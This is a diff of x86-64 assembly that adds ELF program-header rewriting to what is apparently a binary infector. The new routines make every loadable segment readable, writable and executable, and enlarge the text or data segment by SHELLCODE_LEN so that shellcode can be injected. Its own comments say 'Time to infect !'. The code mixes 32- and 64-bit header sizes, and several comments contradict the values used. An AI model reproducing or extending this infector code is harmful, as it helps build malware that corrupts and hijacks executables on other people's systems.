@@ -1373,6 +1373,15 @@ parse32elf:
 	mov r10d, eax; contains pad
 	mov rax, QWORD[rsp]
 	call parse32elfheader
+	;PROGRAM HEADERS
+	cmp QWORD[rsp], 0
+	je text_phdr_parse32
+	call parse32elfphdr ; will return pad
+	jmp phdr_parse_done32
+	text_phdr_parse32:
+	call parse32elfphdrtext
+	phdr_parse_done32:
+
 	add rsp, 8
 retn
 ; int has_data_seg(void *) check if there's a data segment (ret = 1) or only text (ret = 0)
@@ -1562,7 +1571,7 @@ find_new_entry_text32:
 		lea r9, [rsi+rdx]; current phdr
 		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
 		jne continue_fnet32
-		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
+		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_X) means text seg, we're gonna infect it
 		jne continue_fnet32
 		;we found the text segment !This is where the shellcode will be
 		mov eax, DWORD[r9 + 20];store p_memsz
@@ -1673,6 +1682,361 @@ get_text_pad32:
 	pop r9
 	pop rbx
 	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+
+; unsigned long parse32elfphdr(void *file, int wfd)
+parse32elfphdr:
+	push rdi
+	push rsi
+	push rdx
+
+	sub rsp, 4; p_memsz
+	sub rsp, 4;p_flags
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	xor rbx, rbx 
+	mov ebx, DWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_p32ephdr: 
+		cmp cx, WORD[rsp]
+		jge loop_p32ephdr_exit
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne print_p32ephdr
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		mov rsi, r9
+		mov rdx, 4
+		mov rax, 1
+		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax	
+		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
+		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		je p32ephdr_data_seg
+		;we just write the rest of the phdr if we get here
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [r9 + 4]
+		mov rdx, 20; 32-4 - 8( p_flags & p_align)
+		mov rax, 1
+		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+				;write p_flags
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
+		mov rdx, 4; sizeof(uint32_t)
+		mov rax, 1
+		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		;write remaining p_align
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		mov rdx, 4
+		lea rsi, [r9 + 28]
+		mov rax, 1
+		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax	
+		jmp continue_p32ephdr		
+		p32ephdr_data_seg:
+		;we found the data segment ! bss ect... Time to infect !
+		;write till p_filesz
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [r9 + 4]
+		mov rdx, 12; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
+		mov rax, 1
+		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		xor rax, rax
+		mov eax, DWORD[r9 + 20]
+		mov DWORD[rsp + 6], eax; store p_memsz
+		add DWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
+		;write custom memsz, filesz
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [rsp + 38]; 32 from push + 6 rsp
+		mov rdx, 4
+		mov rax, 1
+		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
+		mov rax, 1
+		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		;write p_flags
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
+		mov rdx, 4; sizeof(uint32_t)
+		mov rax, 1
+		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		;write remaining p_align
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		mov rdx, 4
+		lea rsi, [r9 + 28]
+		mov rax, 1
+		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax	
+		sub DWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
+		;set pad value
+		xor rax, rax
+		mov eax, DWORD[rsp + 6]; p_memsz
+		sub eax, [r9 + 16]; ret = p_memsz - p_filesz
+
+		jmp continue_p32ephdr
+		print_p32ephdr: ; case where we don't modify the phdr at all 
+			push rax
+			push rcx
+			push rsi
+			push rdx
+
+			mov rsi, r9
+			mov rdx, 32; sizeof(Elf64_Phdr)
+			mov rax, 1
+			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
+			pop rdx
+			pop rsi
+			pop rcx
+			pop rax
+		continue_p32ephdr:
+		inc rcx
+		add rdx, 32; rdx += sizeof(Elf64_Phdr)
+		jmp loop_p32ephdr
+	loop_p32ephdr_exit: 
+	add rsp, 2
+	add rsp, 4
+	add rsp, 4
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+; unsigned long parse64elfphdrtext(void *file, int wfd)
+parse32elfphdrtext:
+	push rdi
+	push rsi
+	push rdx
+
+	sub rsp, 4; p_memsz
+	sub rsp, 4;p_flags
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	xor rbx, rbx 
+	mov ebx, DWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_p32ephdrt: 
+		cmp cx, WORD[rsp]
+		jge loop_p32ephdrt_exit
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne print_p32ephdrt
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		mov rsi, r9
+		mov rdx, 4
+		mov rax, 1
+		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax	
+		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
+		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
+		je p32ephdrt_data_seg
+		;we just write the rest of the phdr if we get here
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [r9 + 4]
+		mov rdx, 20; 32-4 - 8( p_flags & p_align)
+		mov rax, 1
+		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+				;write p_flags
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
+		mov rdx, 4; sizeof(uint32_t)
+		mov rax, 1
+		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		;write remaining p_align
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		mov rdx, 4
+		lea rsi, [r9 + 28]
+		mov rax, 1
+		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax	
+		jmp continue_p32ephdrt		
+		p32ephdrt_data_seg:
+		;we found the data segment ! bss ect... Time to infect !
+		;write till p_filesz
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [r9 + 4]
+		mov rdx, 12; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
+		mov rax, 1
+		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		xor rax, rax
+		mov eax, DWORD[r9 + 20]
+		mov DWORD[rsp + 6], eax; store p_memsz
+		add DWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
+		;write custom memsz, filesz
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [rsp + 38]; 32 from push + 6 rsp
+		mov rdx, 4
+		mov rax, 1
+		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
+		mov rax, 1
+		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		;write p_flags
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
+		mov rdx, 4; sizeof(uint32_t)
+		mov rax, 1
+		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		;write remaining p_align
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		mov rdx, 4
+		lea rsi, [r9 + 28]
+		mov rax, 1
+		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax	
+		sub DWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
+		;set pad value
+		xor rax, rax
+		mov eax, DWORD[rsp + 6]; p_memsz
+		sub eax, [r9 + 16]; ret = p_memsz - p_filesz
+
+		jmp continue_p32ephdrt
+		print_p32ephdrt: ; case where we don't modify the phdr at all 
+			push rax
+			push rcx
+			push rsi
+			push rdx
+
+			mov rsi, r9
+			mov rdx, 32; sizeof(Elf64_Phdr)
+			mov rax, 1
+			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
+			pop rdx
+			pop rsi
+			pop rcx
+			pop rax
+		continue_p32ephdrt:
+		inc rcx
+		add rdx, 32; rdx += sizeof(Elf64_Phdr)
+		jmp loop_p32ephdrt
+	loop_p32ephdrt_exit: 
+	add rsp, 2
+	add rsp, 4
+	add rsp, 4
 	pop rdx
 	pop rsi
 	pop rdi
